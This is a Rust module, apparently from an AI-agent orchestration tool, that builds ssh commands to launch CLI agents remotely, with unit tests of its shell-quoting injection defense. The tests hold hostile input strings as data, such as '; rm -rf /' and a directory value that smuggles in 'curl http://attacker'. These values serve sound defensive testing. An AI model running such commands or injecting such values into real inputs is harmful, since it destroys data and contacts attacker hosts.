//! Pure helpers for building a remote-SSH spawn command.
//!
//! These functions are deliberately side-effect-free and `tokio`-free so the
//! argv construction — the single most security-sensitive piece of the
//! SSH-remote milestone (§6: argv shell injection) — is exhaustively unit
//! tested without touching the network (§4.1).
//!
//! ## Two-level quoting (read this before changing it)
//!
//! The local `ssh` client forwards the remote command to the remote login
//! shell as a **single joined string**, which the remote shell re-parses.
//! So every value must survive two layers of shell parsing:
//!
//! 1. **inner** — each value is wrapped with [`sh_single_quote`] so the
//!    *remote bash* (run via `bash -lc`) treats it as a literal word;
//! 2. **outer** — the assembled bash script is itself wrapped with
//!    [`sh_single_quote`] once more, so the *remote login shell* passes it
//!    to `bash -lc` verbatim.
//!
//! [`sh_single_quote`] is the ONE quoting function, applied at both layers.
//! That uniformity is the defense: there is no second hand-rolled escaper to
//! get wrong.

use std::collections::HashMap;

use agent_core::foundation::exec_target::SshTarget;

/// Marker the remote spawn wrapper prints to stderr with its own pid, so the
/// local side can issue an explicit `kill` over a second ssh connection
/// (§2.2.1). Chosen to be unlikely to occur in real CLI stderr. Captured by
/// the stderr reader in `session::run_session` and consumed by the kill chain
/// in `lifecycle::kill_running_agent`.
pub const REMOTE_PID_MARKER: &str = "ORGII_RPID=";

const REMOTE_RUNTIME_BOOTSTRAP: &str = r#"if [ -f "$HOME/.bashrc" ]; then . "$HOME/.bashrc" >/dev/null 2>&1 || true; fi; if [ -s "${NVM_DIR:-$HOME/.nvm}/nvm.sh" ]; then export NVM_DIR="${NVM_DIR:-$HOME/.nvm}"; . "$NVM_DIR/nvm.sh" >/dev/null 2>&1 || true; nvm use --silent default >/dev/null 2>&1 || nvm use --silent node >/dev/null 2>&1 || nvm use --silent stable >/dev/null 2>&1 || true; fi"#;

/// Escape `s` for safe embedding as a single literal word in a POSIX shell
/// (bash) script: wrap in single quotes and turn each embedded `'` into the
/// `'\''` idiom (close-quote, escaped-quote, reopen-quote).
///
/// Single quotes disable **all** expansion in bash (`$`, backticks, `\`,
/// `;`, `&&` are all literal inside `'...'`), so this is the strongest
/// available quoting. The result always begins and ends with `'`.
///
/// This is the §6 injection defense — every value that crosses into the
/// remote shell goes through here, and here only.
pub fn sh_single_quote(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('\'');
    for ch in s.chars() {
        if ch == '\'' {
            // close current string, add an escaped literal quote, reopen
            out.push_str("'\\''");
        } else {
            out.push(ch);
        }
    }
    out.push('\'');
    out
}

/// Filter an agent's env map for remote forwarding (§2.3).
///
/// Rule of thumb: **forward auth env, strip local-path env**.
/// - Strip `CLAUDE_CONFIG_DIR` / `CODEX_HOME` / `GEMINI_CLI_HOME` — they
///   point at local per-session profile dirs that don't exist on the remote
///   host; the remote CLI uses its own default config location.
/// - Strip `http_proxy` / `https_proxy` / `all_proxy` when they point at a
///   loopback address — that's ORG-II's MITM proxy, unreachable remotely.
///   Enterprise proxies (non-loopback) are forwarded unchanged.
/// - Everything else (provider auth keys/base-URLs, `no_proxy`, …) is
///   forwarded.
///
/// Output is sorted by key so the assembled argv is deterministic (matters
/// for snapshot tests and stable logs).
pub fn env_for_remote(env: &HashMap<String, String>) -> Vec<(String, String)> {
    const STRIP_KEYS: &[&str] = &["CLAUDE_CONFIG_DIR", "CODEX_HOME", "GEMINI_CLI_HOME"];

    let mut out: Vec<(String, String)> = env
        .iter()
        .filter(|(k, v)| {
            if STRIP_KEYS.iter().any(|s| s.eq_ignore_ascii_case(k)) {
                return false;
            }
            if matches!(
                k.to_ascii_lowercase().as_str(),
                "http_proxy" | "https_proxy" | "all_proxy"
            ) {
                return !is_loopback_url(v);
            }
            true
        })
        .map(|(k, v)| (k.clone(), v.clone()))
        .collect();
    out.sort_by(|a, b| a.0.cmp(&b.0));
    out
}

/// Heuristic: does `value` (a proxy URL) point at a loopback address that
/// wouldn't be reachable from a remote host? Catches `127.0.0.1`,
/// `localhost`, `0.0.0.0`, and `::1` in any position.
fn is_loopback_url(value: &str) -> bool {
    let lower = value.to_ascii_lowercase();
    lower.contains("127.0.0.1")
        || lower.contains("localhost")
        || lower.contains("0.0.0.0")
        || lower.contains("::1")
}

/// Prefix remote shell scripts with a quiet user-runtime bootstrap.
///
/// Remote GUI/TUI launches run under non-interactive `bash -lc`, so exports
/// that only live in `.bashrc` are otherwise absent. Source it quietly first,
/// then load nvm for npm-based CLIs (Claude Code, Codex, Gemini) that depend
/// on a user-managed Node. This keeps preflight and spawn on the same PATH
/// while remaining a no-op on hosts without either file.
fn with_remote_runtime_bootstrap(script: &str) -> String {
    format!("{REMOTE_RUNTIME_BOOTSTRAP}; {script}")
}

/// Extract the remote pid from a stderr line carrying the
/// [`REMOTE_PID_MARKER`] (e.g. `ORGII_RPID=12345`). Returns `None` if the
/// line has no marker or the digits don't parse. Used by the explicit-kill
/// chain (§2.2.1) — a marker line must never be shown to the user as
/// ordinary stderr.
pub fn parse_remote_pid(line: &str) -> Option<u32> {
    let idx = line.find(REMOTE_PID_MARKER)?;
    let rest = &line[idx + REMOTE_PID_MARKER.len()..];
    let digits: String = rest.chars().take_while(|c| c.is_ascii_digit()).collect();
    digits.parse::<u32>().ok()
}

/// Common ssh client options shared by spawn and check commands:
/// - `BatchMode=yes` — fail fast on a missing key / hostkey instead of
///   hanging the headless session on an interactive prompt.
/// - `ControlMaster=auto` + `ControlPath` + `ControlPersist=60s` — one
///   authenticated connection reused across binary-check / dir-check /
///   spawn / kill (§2.2).
/// - optional `-p <port>`.
///
/// Returns the option args only; callers append the host and remote command.
fn ssh_option_args(control_path: &str, port: Option<u16>) -> Vec<String> {
    let mut argv: Vec<String> = vec![
        "-o".into(),
        "BatchMode=yes".into(),
        "-o".into(),
        "ControlMaster=auto".into(),
        "-o".into(),
        format!("ControlPath={control_path}"),
        "-o".into(),
        "ControlPersist=60s".into(),
        // Keepalive: detect a dropped connection (~90s) instead of hanging
        // the session forever (§3-Phase3). This does NOT reconnect — a
        // dropped remote run is re-spawned with `--resume <cli_session_id>`.
        "-o".into(),
        "ServerAliveInterval=30".into(),
        "-o".into(),
        "ServerAliveCountMax=3".into(),
    ];
    if let Some(port) = port {
        argv.push("-p".into());
        argv.push(port.to_string());
    }
    argv
}

/// Assemble the local `ssh` argv that runs `program args` on `ssh.host`
/// with `env` set and `working_dir` as cwd.
///
/// Returns the arg vector **excluding** the leading `ssh` binary name
/// (the caller supplies `Command::new("ssh")`).
///
/// Shape (§2.2):
/// ```text
/// -o BatchMode=yes -o ControlMaster=auto -o ControlPath=<p> -o ControlPersist=60s
/// [-p <port>] <host> bash -lc '<wrapper>'
/// ```
/// where `<wrapper>` is:
/// ```text
/// echo "ORGII_RPID=$$" >&2; cd '<dir>' && exec env '<K=V>' ... '<program>' '<arg>' ...
/// ```
/// `exec` guarantees the reported pid is the CLI process itself (§2.2.1).
/// `env` is expected already filtered via [`env_for_remote`].
pub fn build_remote_command_argv(
    ssh: &SshTarget,
    program: &str,
    args: &[String],
    env: &[(String, String)],
    working_dir: &str,
    control_path: &str,
) -> Vec<String> {
    // 1. Inner script (what `bash -lc` runs). Every value is single-quote
    //    escaped so remote bash treats each as a literal word.
    let mut script = String::new();
    script.push_str("echo \"ORGII_RPID=$$\" >&2");
    script.push_str("; ");
    script.push_str(REMOTE_RUNTIME_BOOTSTRAP);
    script.push_str("; cd ");
    script.push_str(&sh_single_quote(working_dir));
    script.push_str(" && exec env");
    for (k, v) in env {
        script.push(' ');
        script.push_str(&sh_single_quote(&format!("{k}={v}")));
    }
    script.push(' ');
    script.push_str(&sh_single_quote(program));
    for a in args {
        script.push(' ');
        script.push_str(&sh_single_quote(a));
    }

    // 2. Outer wrap: the whole script becomes the single argument to the
    //    remote `bash -lc`. Single-quote-escaped again so the remote login
    //    shell forwards it verbatim (no re-splitting, no expansion).
    let remote_command = format!("bash -lc {}", sh_single_quote(&script));

    // 3. Local ssh argv. The remote command is ONE element so ssh forwards
    //    it as-is. No `-t`/PTY — a PTY merges stdout/stderr and translates
    //    `\n`→`\r\n`, breaking the line-based parser (§2.2, §6).
    let mut argv = ssh_option_args(control_path, ssh.port);
    argv.push(ssh.host.clone());
    argv.push(remote_command);
    argv
}

/// Assemble a short ssh argv that runs an arbitrary check script on the
/// remote host (e.g. `command -v -- claude`, `test -d /repo`) via
/// `bash -lc`. Used by the remote binary / dir health checks (§1, §3-Phase1).
/// Shares the ControlMaster socket with [`build_remote_command_argv`] so the
/// checks ride the same authenticated connection as the spawn.
pub fn build_remote_check_argv(ssh: &SshTarget, script: &str, control_path: &str) -> Vec<String> {
    let script = with_remote_runtime_bootstrap(script);
    let remote_command = format!("bash -lc {}", sh_single_quote(&script));
    let mut argv = ssh_option_args(control_path, ssh.port);
    argv.push(ssh.host.clone());
    argv.push(remote_command);
    argv
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- sh_single_quote: the injection defense ---------------------------

    #[test]
    fn empty_string_is_empty_quotes() {
        assert_eq!(sh_single_quote(""), "''");
    }

    #[test]
    fn simple_word_is_wrapped() {
        assert_eq!(sh_single_quote("claude"), "'claude'");
    }

    #[test]
    fn spaces_are_safe_inside_quotes() {
        assert_eq!(sh_single_quote("hello world"), "'hello world'");
    }

    #[test]
    fn embedded_single_quote_uses_idiom() {
        // the one char that must be escaped
        assert_eq!(sh_single_quote("a'b"), "'a'\\''b'");
    }

    #[test]
    fn command_substitution_is_neutralized() {
        // $(whoami) must end up literal inside single quotes
        let q = sh_single_quote("$(whoami)");
        assert_eq!(q, "'$(whoami)'");
        assert!(q.starts_with('\'') && q.ends_with('\''));
    }

    #[test]
    fn backticks_are_neutralized() {
        assert_eq!(sh_single_quote("`whoami`"), "'`whoami`'");
    }

    #[test]
    fn semicolons_and_operators_are_literal() {
        let q = sh_single_quote("; rm -rf / && echo pwned");
        // The whole payload sits inside one single-quoted word, so `;`/`&&`
        // cannot act as command separators on the remote shell.
        assert_eq!(q, "'; rm -rf / && echo pwned'");
    }

    #[test]
    fn newline_is_safe_inside_single_quotes() {
        // bash single-quoted strings may span newlines; no break-out.
        let q = sh_single_quote("line1\nline2");
        assert_eq!(q, "'line1\nline2'");
    }

    #[test]
    fn dollar_signs_are_literal() {
        assert_eq!(sh_single_quote("$HOME/${PATH}"), "'$HOME/${PATH}'");
    }

    #[test]
    fn every_quote_is_part_of_idiom() {
        // Structural invariant: the output has no lone `'` — every `'` is
        // part of a `'\''` (close/escape/reopen) or the wrapping ends.
        for s in ["", "x", "'", "a'b'c", "' '", "''", "it's"] {
            let q = sh_single_quote(s);
            assert!(q.starts_with('\'') && q.ends_with('\''));
            // stripping the wrapper, what remains alternates escaped-quotes
            // and literal runs; verify by reconstructing the original.
            assert_eq!(unescape(&q), s, "round-trip failed for {s:?}");
        }
    }

    /// Decode `sh_single_quote` output back to the original, to assert
    /// round-trip safety (proves no value can break out).
    fn unescape(q: &str) -> String {
        // Strip the outermost pair of quotes; the body is literal runs
        // separated by the `'\''` idiom (which contributes one `'`).
        let body = &q[1..q.len() - 1];
        body.replace("'\\''", "'")
    }

    /// Recover the script that remote `bash -lc` will actually execute:
    /// strip the `bash -lc ` prefix, then decode the outer single-quote
    /// wrapping. Tests assert against THIS so they check what bash sees,
    /// not the double-escaped wire form.
    fn decoded_script(remote_command: &str) -> String {
        let payload = remote_command.strip_prefix("bash -lc ").unwrap();
        unescape(payload)
    }

    // --- env_for_remote ---------------------------------------------------

    #[test]
    fn strips_local_path_config_dirs() {
        let mut m = HashMap::new();
        m.insert("ANTHROPIC_API_KEY".into(), "sk-keep".into());
        m.insert("CLAUDE_CONFIG_DIR".into(), "/local/profile".into());
        m.insert("CODEX_HOME".into(), "/local/codex".into());
        m.insert("GEMINI_CLI_HOME".into(), "/local/gemini".into());
        let out = env_for_remote(&m);
        let keys: Vec<&str> = out.iter().map(|(k, _)| k.as_str()).collect();
        assert_eq!(keys, vec!["ANTHROPIC_API_KEY"]);
    }

    #[test]
    fn strips_loopback_proxy() {
        let mut m = HashMap::new();
        m.insert("HTTPS_PROXY".into(), "http://127.0.0.1:8001".into());
        m.insert("https_proxy".into(), "http://localhost:8001".into());
        m.insert("HTTP_PROXY".into(), "http://0.0.0.0:9000".into());
        assert!(env_for_remote(&m).is_empty());
    }

    #[test]
    fn forwards_enterprise_proxy_and_no_proxy() {
        let mut m = HashMap::new();
        m.insert(
            "https_proxy".into(),
            "http://corp.proxy.example:3128".into(),
        );
        m.insert("no_proxy".into(), "127.0.0.1,localhost".into());
        let out = env_for_remote(&m);
        let keys: Vec<&str> = out.iter().map(|(k, _)| k.as_str()).collect();
        assert_eq!(keys, vec!["https_proxy", "no_proxy"]);
    }

    #[test]
    fn forwards_provider_auth_and_base_url() {
        let mut m = HashMap::new();
        m.insert("ANTHROPIC_API_KEY".into(), "sk-x".into());
        m.insert("ANTHROPIC_BASE_URL".into(), "https://api.example".into());
        m.insert("OPENAI_API_KEY".into(), "sk-y".into());
        let out = env_for_remote(&m);
        assert_eq!(out.len(), 3);
    }

    #[test]
    fn output_is_sorted_by_key() {
        let mut m = HashMap::new();
        m.insert("Z_LAST".into(), "1".into());
        m.insert("A_FIRST".into(), "2".into());
        m.insert("M_MIDDLE".into(), "3".into());
        let filtered = env_for_remote(&m);
        let keys: Vec<&str> = out_keys(&filtered);
        assert_eq!(keys, vec!["A_FIRST", "M_MIDDLE", "Z_LAST"]);
    }

    fn out_keys(v: &[(String, String)]) -> Vec<&str> {
        v.iter().map(|(k, _)| k.as_str()).collect()
    }

    // --- parse_remote_pid -------------------------------------------------

    #[test]
    fn parses_exact_marker_line() {
        assert_eq!(parse_remote_pid("ORGII_RPID=12345"), Some(12345));
    }

    #[test]
    fn parses_marker_embedded_in_noise() {
        assert_eq!(parse_remote_pid("junk ORGII_RPID=42 trailing"), Some(42));
    }

    #[test]
    fn missing_marker_returns_none() {
        assert_eq!(parse_remote_pid("just some stderr"), None);
    }

    #[test]
    fn non_digit_after_marker_returns_none() {
        assert_eq!(parse_remote_pid("ORGII_RPID=abc"), None);
    }

    // --- build_remote_command_argv ---------------------------------------

    fn ssh_target(host: &str, port: Option<u16>) -> SshTarget {
        SshTarget {
            host: host.into(),
            port,
        }
    }

    #[test]
    fn argv_has_required_ssh_options_and_no_pty() {
        let argv = build_remote_command_argv(
            &ssh_target("user@host", None),
            "claude",
            &["-p".to_string()],
            &[],
            "/repo",
            "/cache/orgii/ssh-%C",
        );
        assert_eq!(
            argv[0..8],
            [
                "-o",
                "BatchMode=yes",
                "-o",
                "ControlMaster=auto",
                "-o",
                "ControlPath=/cache/orgii/ssh-%C",
                "-o",
                "ControlPersist=60s"
            ]
        );
        // keepalive (§3-Phase3)
        assert_eq!(
            argv[8..12],
            [
                "-o",
                "ServerAliveInterval=30",
                "-o",
                "ServerAliveCountMax=3"
            ]
        );
        // host, then the single remote-command element
        assert_eq!(argv[12], "user@host");
        assert_eq!(argv.len(), 14);
        assert!(argv[13].starts_with("bash -lc "));
        // CRITICAL: no -t / -tt anywhere (would enable a PTY)
        assert!(argv.iter().all(|a| !a.starts_with("-t")));
    }

    #[test]
    fn argv_includes_port_when_set() {
        let argv = build_remote_command_argv(
            &ssh_target("host", Some(2222)),
            "claude",
            &[],
            &[],
            "/r",
            "/c/ssh-%C",
        );
        let port_idx = argv.iter().position(|a| a == "-p").unwrap();
        assert_eq!(argv[port_idx + 1], "2222");
    }

    #[test]
    fn build_remote_check_argv_wraps_script_in_login_bash() {
        let argv = build_remote_check_argv(
            &ssh_target("user@host", Some(2222)),
            "command -v -- 'claude'",
            "/c/ssh-%C",
        );
        // shares spawn's ssh options (incl. port), no PTY
        assert_eq!(
            argv[0..8],
            [
                "-o",
                "BatchMode=yes",
                "-o",
                "ControlMaster=auto",
                "-o",
                "ControlPath=/c/ssh-%C",
                "-o",
                "ControlPersist=60s"
            ]
        );
        assert_eq!(argv[argv.len() - 2], "user@host");
        let remote = argv.last().unwrap();
        let script = decoded_script(remote);
        assert!(script.contains("$HOME/.bashrc"));
        assert!(script.contains("${NVM_DIR:-$HOME/.nvm}/nvm.sh"));
        assert!(script.contains("nvm use --silent default"));
        assert!(script.ends_with("command -v -- 'claude'"));
        assert!(argv.iter().all(|a| !a.starts_with("-t")));
    }

    #[test]
    fn remote_command_wraps_script_in_login_bash() {
        let argv = build_remote_command_argv(
            &ssh_target("h", None),
            "claude",
            &["--output-format".into(), "stream-json".into()],
            &[("ANTHROPIC_API_KEY".into(), "sk-x".into())],
            "/home/u/repo",
            "/c/ssh-%C",
        );
        let remote = argv.last().unwrap();
        // outer wrapper intact
        assert!(remote.starts_with("bash -lc '"));
        assert!(remote.ends_with('\''));
        // decode to what bash -lc actually executes, then assert structure
        let script = decoded_script(remote);
        assert!(script.contains("ORGII_RPID=$$"));
        assert!(script.contains("$HOME/.bashrc"));
        assert!(script.contains("${NVM_DIR:-$HOME/.nvm}/nvm.sh"));
        assert!(script.contains("nvm use --silent node"));
        assert!(script.contains("cd '/home/u/repo'"));
        assert!(script.contains("exec env"));
        assert!(script.contains("'ANTHROPIC_API_KEY=sk-x'"));
        assert!(script.contains("'claude'"));
        assert!(script.contains("'--output-format'"));
        assert!(script.contains("'stream-json'"));
    }

    #[test]
    fn malicious_task_string_cannot_break_out() {
        // A task arg carrying shell metacharacters must remain a single
        // quoted word in the script bash executes — no command separation.
        let evil = "; rm -rf / # $(whoami) `id`";
        let argv = build_remote_command_argv(
            &ssh_target("h", None),
            "claude",
            &["-p".into(), evil.to_string()],
            &[],
            "/r",
            "/c/ssh-%C",
        );
        let remote = argv.last().unwrap();
        let script = decoded_script(remote);
        // The evil payload is a fully single-quoted word in the inner script.
        assert!(
            script.contains(&sh_single_quote(evil)),
            "evil payload should be quoted as a literal word; script={script}"
        );
        assert!(remote.starts_with("bash -lc '") && remote.ends_with('\''));
    }

    #[test]
    fn malicious_env_value_cannot_break_out() {
        let evil = "x'; DROP TABLE; '";
        let argv = build_remote_command_argv(
            &ssh_target("h", None),
            "claude",
            &[],
            &[("ANTHROPIC_API_KEY".into(), evil.to_string())],
            "/r",
            "/c/ssh-%C",
        );
        let remote = argv.last().unwrap();
        let script = decoded_script(remote);
        // env value is embedded as KEY=<quoted-value> inside one quoted word
        assert!(
            script.contains(&sh_single_quote(&format!("ANTHROPIC_API_KEY={evil}"))),
            "env value should be quoted; script={script}"
        );
    }

    #[test]
    fn malicious_dir_cannot_break_out() {
        let evil = "/repo; curl http://attacker";
        let argv = build_remote_command_argv(
            &ssh_target("h", None),
            "claude",
            &[],
            &[],
            evil,
            "/c/ssh-%C",
        );
        let remote = argv.last().unwrap();
        let script = decoded_script(remote);
        assert!(
            script.contains(&format!("cd {}", sh_single_quote(evil))),
            "dir should be quoted; script={script}"
        );
    }
}
